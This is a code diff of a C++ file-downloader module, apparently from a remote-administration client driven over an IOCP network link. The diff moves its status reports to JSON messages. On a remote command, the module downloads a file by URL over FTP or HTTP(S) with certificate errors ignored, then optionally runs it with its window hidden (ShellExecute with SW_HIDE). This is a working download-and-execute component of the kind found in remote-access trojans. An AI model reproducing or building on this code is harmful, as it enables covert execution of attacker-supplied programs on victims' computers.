@@ -1,35 +1,35 @@
 #include "FileDownloader.h"
 #include <stdio.h>
 #include "IOCPClient.h"
+#include "utils.h"
+#include "json\json.h"
 
 #pragma comment(lib,"wininet.lib")
 
-BOOL MakesureDirExist(const WCHAR* Path,BOOL bIncludeFileName = FALSE);
+#ifdef _DEBUG
+#pragma comment(lib,"jsond.lib")
+#else
+#pragma comment(lib,"json.lib")
+#endif
 
-CFileDownloader::CFileDownloader(InitParam* pInitParam) :
-CEventHandler(MINIDOWNLOAD)
+CFileDownloader::CFileDownloader(CManager*pManager, InitParam* pInitParam) :
+CMsgHandler(pManager, MINIDOWNLOAD)
 {
 	//save path + url.
-	m_szSavePath = (WCHAR*)malloc(0x1000*sizeof(WCHAR));
-	m_szUrlPath = (WCHAR*)malloc(0x1000*sizeof(WCHAR));
-	m_szHost = (WCHAR*)malloc(0x1000*sizeof(WCHAR));
-	m_szUser = (WCHAR*)malloc(0x1000*sizeof(WCHAR));
-	m_szPassword = (WCHAR*)malloc(0x1000*sizeof(WCHAR));
-	m_szExtraInfo = (WCHAR*)malloc(0x1000*sizeof(WCHAR));
-	
-	ZeroMemory(m_szSavePath,0x1000*sizeof(WCHAR));
-	ZeroMemory(m_szUrlPath,0x1000*sizeof(WCHAR));
-	ZeroMemory(m_szHost,0x1000*sizeof(WCHAR));
-	ZeroMemory(m_szUser,0x1000*sizeof(WCHAR));
-	ZeroMemory(m_szPassword,0x1000*sizeof(WCHAR));
-	ZeroMemory(m_szExtraInfo,0x1000*sizeof(WCHAR));
+	m_szSavePath = (TCHAR*)calloc(1,0x1000*sizeof(TCHAR));
+	m_szUrlPath = (TCHAR*)calloc(1, 0x1000 * sizeof(TCHAR));
+	m_szHost = (TCHAR*)calloc(1, 0x1000 * sizeof(TCHAR));
+	m_szUser = (TCHAR*)calloc(1, 0x1000 * sizeof(TCHAR));
+	m_szPassword = (TCHAR*)calloc(1, 0x1000 * sizeof(TCHAR));
+	m_szExtraInfo = (TCHAR*)calloc(1, 0x1000 * sizeof(TCHAR));
+
 	//
 	m_pInit = pInitParam;
-
+	m_DownloadSuccess = FALSE;
 	m_Buffer = (char*)malloc(0x10000);
 
-	m_ullTotalSize = 0;
-	m_ullFinishedSize = 0;
+	m_iFinishedSize = 0;
+	m_iTotalSize = -1;
 
 	m_hConnect = NULL;
 	m_hInternet = NULL;
@@ -38,8 +38,7 @@ CEventHandler(MINIDOWNLOAD)
 }
 
 
-CFileDownloader::~CFileDownloader()
-{
+CFileDownloader::~CFileDownloader(){
 	free(m_szSavePath);
 	free(m_szUrlPath);
 	free(m_szHost);
@@ -51,40 +50,35 @@ CFileDownloader::~CFileDownloader()
 
 void CFileDownloader::OnClose()
 {
-	if (m_hLocalFile != INVALID_HANDLE_VALUE)
-	{
+	if (m_hLocalFile != INVALID_HANDLE_VALUE){
 		CloseHandle(m_hLocalFile);
 		m_hLocalFile = INVALID_HANDLE_VALUE;
 	}
-	if (m_hRemoteFile != NULL)
-	{
+	if (m_hRemoteFile != NULL){
 		InternetCloseHandle(m_hRemoteFile);
 		m_hRemoteFile = NULL;
 	}
-	if (m_hConnect != NULL)
-	{
+	if (m_hConnect != NULL){
 		InternetCloseHandle(m_hConnect);
 		m_hConnect = NULL;
 	}
-	if (m_hInternet != NULL)
-	{
+	if (m_hInternet != NULL){
 		InternetCloseHandle(m_hInternet);
 		m_hInternet = NULL;
 	}
+	if (!m_DownloadSuccess){
+		DeleteFile(m_szSavePath);
+	}
 }
 
-void CFileDownloader::OnConnect()
+void CFileDownloader::OnOpen()
 {
 
 }
 
-void CFileDownloader::OnReadPartial(WORD Event, DWORD Total, DWORD Read, char*Buffer)
+void CFileDownloader::OnReadMsg(WORD Msg,DWORD dwSize, char*Buffer)
 {
-
-}
-void CFileDownloader::OnReadComplete(WORD Event, DWORD Total, DWORD Read, char*Buffer)
-{
-	switch (Event)
+	switch (Msg)
 	{
 	case MNDD_GET_FILE_INFO:
 		OnGetFileInfo();
@@ -100,62 +94,96 @@ void CFileDownloader::OnReadComplete(WORD Event, DWORD Total, DWORD Read, char*B
 
 void CFileDownloader::OnEndDownload()
 {
-	Disconnect();
+	Close();
 	//
-	if (m_pInit->dwFlags & FILEDOWNLOADER_FLAG_RUNAFTERDOWNLOAD){
-		ShellExecuteW(NULL, L"open", m_szSavePath, NULL, NULL, SW_HIDE);
+	m_DownloadSuccess = TRUE;
+
+	if (m_pInit->dwFlags & 
+		FILEDOWNLOADER_FLAG_RUNAFTERDOWNLOAD){
+
+		ShellExecute(NULL, TEXT("open"), m_szSavePath, NULL, NULL, SW_HIDE);
 	}
 }
+
+/*
+{
+	"code" : "",
+	"err" : "",
+	"total_size" : 
+	"finished_size" : 
+}
+*/
+
 void CFileDownloader::OnContinueDownload()
 {
-	DownloadResult result = { 0 };
 	//Continue Download.
+	Json::Value root;
 	DWORD dwReadBytes = 0;
+	DWORD dwWriteBytes = 0;
 	memset(m_Buffer,0,0x10000);
-	if (FALSE == InternetReadFile(m_hRemoteFile, m_Buffer, 0x10000, &dwReadBytes))
-	{
-		result.dwStatu = 1;
-		goto Reply;
+	if (!InternetReadFile(m_hRemoteFile, m_Buffer, 0x10000, &dwReadBytes)){
+		root["code"] = "-1";
+		root["err"] = "InternetReadFile Failed";
+		string res = Json::FastWriter().write(root);
+		SendMsg(MNDD_DOWNLOAD_RESULT, (void*)res.c_str(), res.length() + 1);
+		return;
 	}
-	if (FALSE == WriteFile(m_hLocalFile, m_Buffer, dwReadBytes, &result.dwWriteSize, NULL) ||
-		dwReadBytes != result.dwWriteSize)
-	{
-		result.dwStatu = 2;
-		goto Reply;
+
+	if (!WriteFile(m_hLocalFile, m_Buffer, dwReadBytes, &dwWriteBytes, NULL) ||
+		dwReadBytes != dwWriteBytes){
+
+		root["code"] = "-2";
+		root["err"] = "WriteFile Failed";
+		string res = Json::FastWriter().write(root);
+		SendMsg(MNDD_DOWNLOAD_RESULT, (void*)res.c_str(), res.length() + 1);
+		return;
 	}
-	m_ullFinishedSize += dwReadBytes;
-	if (!dwReadBytes || m_ullFinishedSize == m_ullTotalSize)
-	{
-		result.dwStatu = 3;
-		goto Reply;
+
+	m_iFinishedSize += dwReadBytes;
+	//
+	root["code"] = "0";		//下载完成...
+	root["err"] = "continue";
+	root["total_size"] = (int)m_iTotalSize;
+	root["finished_size"] = (int)m_iFinishedSize;
+
+	if (!dwReadBytes || 
+		m_iFinishedSize == m_iTotalSize){
+		root["err"] = "finished";
 	}
-Reply:
-	Send(MNDD_DOWNLOAD_RESULT, (char*)&result, sizeof(result));
+	string res = Json::FastWriter().write(root);
+	SendMsg(MNDD_DOWNLOAD_RESULT, (void*)res.c_str(), res.length() + 1);
 	return;
 }
 
+/*
+{
+	"code" : ,
+	"err" : "",
+	"filename" : "",
+	"url" : "",
+	"filesize:" : int,
+}
+*/
 
 void CFileDownloader::OnGetFileInfo()
 {
-	MnddFileInfo response = { 0 };
-	//
+	Json::Value root;
 	DWORD HttpFlag = NULL; 
-
 	char buffer[128] = {0};			//http file size够了;
 	DWORD dwBufferLength = 128;
-	WCHAR*p = NULL;
-
-	WCHAR*pUrl = wcsstr(m_pInit->szURL, L"\n");
+	TCHAR szFileName[MAX_PATH];
+	TCHAR*p = NULL;
+	TCHAR*pUrl = wcsstr(m_pInit->szURL, TEXT("\n"));
 	if (!pUrl){
 		//错误.;
-		Disconnect();
+		Close();
 		return;
 	}
 	*pUrl = 0;
 	pUrl++;
 	//Get Save Path And Url.;
-	lstrcpyW(m_szSavePath, m_pInit->szURL);
-	lstrcatW(m_szSavePath, L"\\");
+	lstrcpy(m_szSavePath, m_pInit->szURL);
+	lstrcat(m_szSavePath, TEXT("\\"));
 	//
 	memset(&url, 0, sizeof(url));
 	url.dwStructSize = sizeof(url);
@@ -172,140 +200,134 @@ void CFileDownloader::OnGetFileInfo()
 	url.dwExtraInfoLength = 0x1000 - 1;
 
 	//url解析失败;
-	if (FALSE == InternetCrackUrlW(pUrl, lstrlenW(pUrl), ICU_ESCAPE, &url))
-	{
-		response.dwStatu = MNDD_STATU_ANALYSE_URL_FAILED;
-		goto ret;
+	if (FALSE == InternetCrackUrl(pUrl, lstrlen(pUrl), ICU_ESCAPE, &url)){
+		root["code"] = "-1";
+		root["err"] = "InternetCrackUrl Failed";
+		string res = Json::FastWriter().write(root);
+		SendMsg(MNDD_FILE_INFO, (void*)res.c_str(), res.length() + 1);
+		return;
 	}
+
 	//Get File Name
 	p = m_szUrlPath + lstrlenW(m_szUrlPath) - 1;
 	while (p > m_szUrlPath && p[0] != L'\\' && p[0] != L'/')
 		p--;
 	if ((p[0] == L'\\' || p[0] == L'/') && p[1])
-		lstrcatW(m_szSavePath, p + 1);
-	else
-		wsprintfW(m_szSavePath + lstrlenW(m_szSavePath), L"%u.dat", GetTickCount());
+		lstrcpy(szFileName, p + 1);
+	else{
+		lstrcpy(szFileName, TEXT("index.html"));
+	}
+
+	lstrcat(m_szSavePath, szFileName);
+	lstrcat(m_szUrlPath, m_szExtraInfo);
 	//
-	lstrcatW(m_szUrlPath, m_szExtraInfo);
-	//
-	m_hInternet = InternetOpenW(NULL, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
-	if (!m_hInternet)
-	{
-		response.dwStatu = MNDD_STATU_INTERNETOPEN_FAILED;
-		goto ret;
+	m_hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
+	if (!m_hInternet){
+		root["code"] = "-2";
+		root["err"] = "InternetOpen Failed";
+		string res = Json::FastWriter().write(root);
+		SendMsg(MNDD_FILE_INFO, (void*)res.c_str(), res.length() + 1);
+		return;
 	}
 	
 	switch (url.nScheme)
 	{
 	case INTERNET_SCHEME_FTP:
-		m_hConnect = InternetConnectW(m_hInternet, m_szHost, url.nPort,
+		m_hConnect = InternetConnect(m_hInternet, m_szHost, url.nPort,
 			m_szUser, m_szPassword, INTERNET_SERVICE_FTP, 0, 0);
-		if (!m_hConnect)
-		{
-			response.dwStatu = MNDD_STATU_INTERNETCONNECT_FAILED;
-			break;
+		if (!m_hConnect){
+			root["code"] = "-3";
+			root["err"] = "InternetConnect Failed";
+			string res = Json::FastWriter().write(root);
+			SendMsg(MNDD_FILE_INFO, (void*)res.c_str(), res.length() + 1);
+			return;
 		}
-		m_hRemoteFile = FtpOpenFileW(m_hConnect, m_szUrlPath, GENERIC_READ, 0, 0);
-		if (!m_hRemoteFile)
-		{
-			response.dwStatu = MNDD_STATU_OPENREMOTEFILE_FILED;
-			break;
+		m_hRemoteFile = FtpOpenFile(m_hConnect, m_szUrlPath, GENERIC_READ, 0, 0);
+		if (!m_hRemoteFile){
+			root["code"] = "-3";
+			root["err"] = "FtpOpenFile Failed";
+			string res = Json::FastWriter().write(root);
+			SendMsg(MNDD_FILE_INFO, (void*)res.c_str(), res.length() + 1);
+			return;
 		}
-		response.dwFileSizeLo = FtpGetFileSize(m_hRemoteFile, &response.dwFileSizeHi);
-		m_ullTotalSize = response.dwFileSizeHi;
-		m_ullTotalSize <<= 32;
-		m_ullTotalSize |= response.dwFileSizeLo;
+		//不支持大于4 G ......
+		m_iTotalSize = (int)FtpGetFileSize(m_hRemoteFile, NULL);
 		break;
 	case INTERNET_SCHEME_HTTPS:
 		HttpFlag |= (INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID
 			| INTERNET_FLAG_IGNORE_CERT_DATE_INVALID);
 	case INTERNET_SCHEME_HTTP:
-		m_hConnect = InternetConnectW(m_hInternet, m_szHost, url.nPort,
+		m_hConnect = InternetConnect(m_hInternet, m_szHost, url.nPort,
 			m_szUser, m_szPassword, INTERNET_SERVICE_HTTP, 0, 0);
-		if (!m_hConnect)
-		{
-			response.dwStatu = MNDD_STATU_INTERNETCONNECT_FAILED;
-			break;
-		}
-		m_hRemoteFile = HttpOpenRequestW(m_hConnect, L"GET", m_szUrlPath, L"1.1", NULL, NULL, HttpFlag, NULL);
-		if (!m_hRemoteFile)
-		{
-			response.dwStatu = MNDD_STATU_OPENREMOTEFILE_FILED;
-			break;
-		}
-		if(FALSE == HttpSendRequestW(m_hRemoteFile, NULL, NULL, NULL, NULL))
-		{
-			response.dwStatu = MNDD_STATU_HTTPSENDREQ_FAILED;
-			break;
-		}
-		if (!HttpQueryInfoA(m_hRemoteFile, HTTP_QUERY_CONTENT_LENGTH, buffer, &dwBufferLength, 0))
-		{
-			response.dwStatu = MNDD_STATU_UNKNOWN_FILE_SIZE; 
-			m_ullTotalSize = -1;
-			break;
+		if (!m_hConnect){
+			root["code"] = "-4";
+			root["err"] = "InternetConnect Failed";
+			string res = Json::FastWriter().write(root);
+			SendMsg(MNDD_FILE_INFO, (void*)res.c_str(), res.length() + 1);
+			return;
 		}
 
-		m_ullTotalSize = atoll(buffer);
-		response.dwFileSizeLo = m_ullTotalSize & 0xFFFFFFFF;
-		response.dwFileSizeHi = (m_ullTotalSize >> 32) & 0xFFFFFFFF;
+		m_hRemoteFile = HttpOpenRequest(m_hConnect, TEXT("GET"), m_szUrlPath, 
+			TEXT("1.1"), NULL, NULL, HttpFlag, NULL);
+		
+		if (!m_hRemoteFile){
+			root["code"] = "-5";
+			root["err"] = "HttpOpenRequest Failed";
+			string res = Json::FastWriter().write(root);
+			SendMsg(MNDD_FILE_INFO, (void*)res.c_str(), res.length() + 1);
+			return;
+		}
+
+		if(!HttpSendRequest(m_hRemoteFile, NULL, NULL, NULL, NULL)){
+			root["code"] = "-6";
+			root["err"] = "HttpSendRequest Failed";
+			string res = Json::FastWriter().write(root);
+			SendMsg(MNDD_FILE_INFO, (void*)res.c_str(), res.length() + 1);
+			return;
+		}
+
+		if (HttpQueryInfoA(m_hRemoteFile, HTTP_QUERY_CONTENT_LENGTH, buffer, &dwBufferLength, 0)){
+			//如果有 content-length的话，就保存起来..
+			m_iTotalSize = atoi(buffer);
+		}
 		break;
 	default:
-		response.dwStatu = MNDD_STATU_UNSUPPORTED_PROTOCOL;
-		break;
+		do{
+			root["code"] = "-8";
+			root["err"] = "Unsupported  Protocol.";
+			string res = Json::FastWriter().write(root);
+			SendMsg(MNDD_FILE_INFO, (void*)res.c_str(), res.length() + 1);
+			return;
+		} while (0);
 	}
+
 	MakesureDirExist(m_szSavePath,TRUE);
-	m_hLocalFile = CreateFile(m_szSavePath, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
-	if (m_hLocalFile == INVALID_HANDLE_VALUE)
-	{
-		response.dwStatu = MNDD_STATU_OPENLOCALFILE_FAILED;
-		goto ret;
+	m_hLocalFile = CreateFile(m_szSavePath, GENERIC_WRITE, 
+		FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+
+	if (m_hLocalFile == INVALID_HANDLE_VALUE){
+		root["code"] = "-9";
+		root["err"] = "CreateFile Failed.";
+		string res = Json::FastWriter().write(root);
+		SendMsg(MNDD_FILE_INFO, (void*)res.c_str(), res.length() + 1);
+		return;
 	}
-ret:
-	Send(MNDD_FILE_SIZE, (char*)&response, sizeof(response));
+
+	//success.
+	root["code"] = "0";
+	root["err"] = "success";
+	root["filesize"] = m_iTotalSize;	//-1 表示未知..
+	//url...
+	char * tempUrl = convertUtf16ToGB2312(pUrl);
+	root["url"] = tempUrl;
+	delete[]tempUrl;
+	//file name...
+	char * filename = convertUtf16ToGB2312(szFileName);
+	root["filename"] = filename;
+	delete[] filename;
+	//
+	string res = Json::FastWriter().write(root);
+	SendMsg(MNDD_FILE_INFO, (void*)res.c_str(), res.length() + 1);
 	return;
 }
 
-static BOOL MakesureDirExist(const WCHAR* Path, BOOL bIncludeFileName)
-{
-	WCHAR*pTempDir = (WCHAR*)malloc((lstrlenW(Path) + 1)*sizeof(WCHAR));
-	lstrcpyW(pTempDir, Path);
-	BOOL bResult = FALSE;
-	WCHAR* pIt = NULL;
-	//找到文件名.;
-	if (bIncludeFileName)
-	{
-		pIt = pTempDir + lstrlenW(pTempDir) - 1;
-		while (pIt[0] != '\\' && pIt[0] != '/' && pIt > pTempDir) pIt--;
-		if (pIt[0] != '/' && pIt[0] != '\\')
-			goto Return;
-		//'/' ---> 0
-		pIt[0] = 0;
-	}
-	//找到':';
-	if ((pIt = wcsstr(pTempDir, L":")) == NULL || (pIt[1] != '\\' && pIt[1] != '/'))
-		goto Return;
-	pIt++;
-
-	while (pIt[0])
-	{
-		WCHAR oldCh;
-		//跳过'/'或'\\';
-		while (pIt[0] && (pIt[0] == '\\' || pIt[0] == '/'))
-			pIt++;
-		//找到结尾.;
-		while (pIt[0] && (pIt[0] != '\\' && pIt[0] != '/'))
-			pIt++;
-		//
-		oldCh = pIt[0];
-		pIt[0] = 0;
-
-		if (!CreateDirectoryW(pTempDir, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
-			goto Return;
-
-		pIt[0] = oldCh;
-	}
-	bResult = TRUE;
-Return:
-	free(pTempDir);
-	return bResult;
-}
